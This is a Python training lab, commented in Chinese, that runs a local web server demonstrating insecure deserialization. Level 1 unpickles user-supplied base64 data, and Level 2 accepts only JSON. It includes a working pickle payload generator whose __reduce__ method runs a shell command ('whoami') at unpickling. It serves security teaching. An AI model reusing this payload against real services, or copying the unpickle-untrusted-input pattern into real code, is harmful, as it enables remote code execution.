#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
反序列化 (Deserialization) 靶场
Level 1: 漏洞版 - 直接 pickle.loads() 反序列化用户给的数据（会执行对象里的代码 → RCE）
Level 2: 防御版 - 只用 JSON 解析纯数据，绝不执行代码

演示：攻击者用一个会执行命令的"恶意对象"喂给服务器，服务器一还原就中招。
"""
import os
import base64
import pickle
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

HOST = "127.0.0.1"
PORT = 5006


# ===== 恶意对象（攻击者的武器） =====
# pickle 在反序列化时会调用 __reduce__ 决定"怎么还原这个对象"
# 这里让它还原时去执行系统命令，并把输出作为"还原后的对象值"
def _rce():
    """反序列化瞬间被调用，返回命令执行结果。"""
    out = os.popen("whoami").read().strip()
    return f"[RCE 成功] 服务器当前用户: {out}"


class Exploit:
    def __reduce__(self):
        # 还原时调用 _rce()，其返回值就是还原后的"对象"
        return (_rce, ())


def gen_payload():
    """生成一个恶意 pickle（base64 编码），还原时会执行 whoami。"""
    return base64.b64encode(pickle.dumps(Exploit())).decode("ascii")


class Handler(BaseHTTPRequestHandler):
    def _html(self, body, status=200, title="反序列化靶场"):
        html = f"""<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">
<title>{title}</title>
<style>body{{font-family:system-ui;max-width:860px;margin:40px auto;padding:0 16px;background:#0f1117;color:#e6e6e6}}
h1{{color:#7ee787}} .ok{{color:#7ee787}} .bad{{color:#ff7b72}} .box{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;margin:12px 0;white-space:pre-wrap;font-family:ui-monospace,monospace;word-break:break-all}}
textarea{{width:100%;height:90px;padding:8px;border-radius:6px;border:1px solid #30363d;background:#0d1117;color:#e6e6e6;font-family:ui-monospace,monospace}}
button{{padding:8px 14px;border:0;border-radius:6px;background:#238636;color:#fff;cursor:pointer;margin:4px 4px 4px 0}}
button.sec{{background:#1f6feb}}
.badge{{display:inline-block;padding:2px 10px;border-radius:12px;font-size:13px;margin-bottom:8px}}
.badge.v{{background:#ff7b7222;color:#ff7b72;border:1px solid #ff7b72}}
.badge.s{{background:#7ee78722;color:#7ee787;border:1px solid #7ee787}}
code{{background:#0d1117;padding:1px 5px;border-radius:4px;color:#ffa657}}</style></head><body>
{body}</body></html>"""
        data = html.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        parsed = urlparse(self.path)
        qs = parse_qs(parsed.query)
        if parsed.path == "/gen_payload":
            self._gen_payload()
        elif parsed.path in ("/", "/index.html"):
            self._render_home(qs.get("level", ["1"])[0])
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        parsed = urlparse(self.path)
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode("utf-8", errors="replace")
        # 简单的 form 解析：payload=xxx&level=1
        form = {}
        for pair in raw.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                from urllib.parse import unquote_plus
                form[k] = unquote_plus(v)
        if parsed.path == "/deserialize":
            self._deserialize(form.get("payload", ""), form.get("level", "1"))
        else:
            self.send_response(404)
            self.end_headers()

    def _gen_payload(self):
        payload = gen_payload()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload.encode("ascii"))

    def _render_home(self, level):
        badge = ('<span class="badge v">漏洞版 Level 1</span>' if level == "1"
                 else '<span class="badge s">防御版 Level 2</span>')
        body = f"""
<h1>🧬 反序列化靶场 (Deserialization)</h1>
{badge}
<p>正常网站会把"对象"（如购物车、登录态）序列化成数据存起来，用的时候再还原。
如果它<b>反序列化了你给的恶意数据</b>，里面的代码会瞬间自动执行。</p>

<form method="POST" action="/deserialize">
  <input type="hidden" name="level" value="{level}">
  <p>① 先点下面的按钮，让服务器帮你造一个"会执行 whoami 的恶意对象"（base64）：</p>
  <button type="button" class="sec" onclick="genPayload()">⚔️ 生成恶意 payload</button>
  <p>② 把生成的内容粘到下面，再点"提交反序列化"：</p>
  <textarea name="payload" id="payload" placeholder="点上面按钮生成，或粘贴 base64 pickle..."></textarea>
  <br>
  <button type="submit">▶ 提交反序列化</button>
</form>

<script>
async function genPayload() {{
  const r = await fetch('/gen_payload');
  const t = await r.text();
  document.getElementById('payload').value = t.trim();
}}
</script>
"""
        self._html(body)

    def _deserialize(self, payload, level):
        if not payload:
            self._html('<div class="box bad">⚠️ 没有收到 payload。</div>')
            return
        try:
            raw = base64.b64decode(payload.strip())
        except Exception as e:
            self._html(f'<div class="box bad">base64 解码失败：{e}</div>')
            return

        if level == "2":
            # 防御版：只用 JSON 解析纯数据，绝不执行代码
            try:
                json.loads(raw.decode("utf-8", errors="replace"))
                self._html('<div class="box ok">✅ 安全：成功解析为 JSON 纯数据，未执行任何代码。</div>')
            except Exception:
                self._html('<div class="box ok">✅ 安全拒绝：检测到非 JSON 数据（如 pickle 字节），'
                           '仅接受 JSON 纯数据格式，因此没有执行任何代码 → 漏洞被堵死。</div>')
            return

        # Level 1 漏洞版：直接反序列化用户数据
        try:
            obj = pickle.loads(raw)   # ← 危险！还原瞬间 _rce() 被执行
            self._html(f'<div class="box bad">💥 反序列化成功！还原出的"对象值"：\n{obj}\n\n'
                       f'→ 你只是发了一段"数据"，服务器却替你执行了系统命令。</div>')
        except Exception as e:
            self._html(f'<div class="box bad">反序列化出错：{e}</div>')


if __name__ == "__main__":
    print(f"反序列化靶场运行中: http://{HOST}:{PORT}/?level=1")
    ThreadingHTTPServer((HOST, PORT), Handler).serve_forever()
